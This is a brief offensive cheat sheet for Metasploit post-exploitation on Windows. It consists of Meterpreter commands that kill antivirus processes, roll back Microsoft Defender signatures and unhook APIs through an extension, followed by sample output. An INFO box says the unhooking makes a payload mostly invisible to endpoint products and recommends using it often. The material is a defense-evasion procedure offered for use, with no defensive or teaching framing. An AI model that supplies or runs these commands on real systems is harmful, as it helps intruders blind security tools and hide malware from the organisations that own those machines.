---
author(s):
  - Userware
tags:
  - post-exploitation
  - defense-evasion
  - security-endpoints
  - coff-loader
  - metasploit-framework
---
#  Metasploit

## 01 - Disable Endpoints

```
meterpreter > run post/windows/manage/killav
```

## 02 - Remove Definitions

```
meterpreter > run post/windows/manage/rollback_defender_signatures action=rollback
```

## 03 - Unhook APIs

> [!INFO]
> This will make your payload mostly invisible from most endpoint solutions. Use this technique often when executing offensive tools in the memory.

Load the extension.

```
meterpreter > load peinjector

..[omitted]..
Unhook Commands
===============

    Command       Description
    -------       -----------
    unhook_pe     Unhook the current process
```

Unhook runtime.

```
meterpreter > unhook_pe
[+] Command execution completed:
[0, 0, nil]
```